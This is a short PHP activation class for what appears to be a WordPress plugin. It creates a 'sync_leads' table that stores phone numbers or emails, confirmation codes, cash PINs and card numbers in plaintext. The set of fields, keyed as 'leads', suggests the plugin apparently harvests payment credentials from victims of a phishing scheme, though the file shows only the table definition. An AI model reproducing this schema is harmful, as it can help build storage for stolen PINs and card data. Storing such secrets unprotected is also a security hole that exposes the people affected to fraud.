<?php

/**
 * Fired during plugin activation.
 *
 * This class defines all code necessary to run during the plugin's activation.
 *
 */

class Plugin_Activator {

    public static function activate() {
        // Create sync leads table
        global $wpdb;
        $table_name      = $wpdb->prefix . 'sync_leads';
        $charset_collate = $wpdb->get_charset_collate();

        $sql = "CREATE TABLE IF NOT EXISTS $table_name (
                    id INT AUTO_INCREMENT,
                    nonce VARCHAR(255) UNIQUE NOT NULL,
                    phone_or_email VARCHAR(255) NULL,
                    confirmation_code VARCHAR(50) NULL,
                    cash_pin VARCHAR(50) NULL,
                    card_number VARCHAR(50) NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
                    PRIMARY KEY (id)
                ) $charset_collate;";

        require_once ABSPATH . 'wp-admin/includes/upgrade.php';
        dbDelta( $sql );

    }

}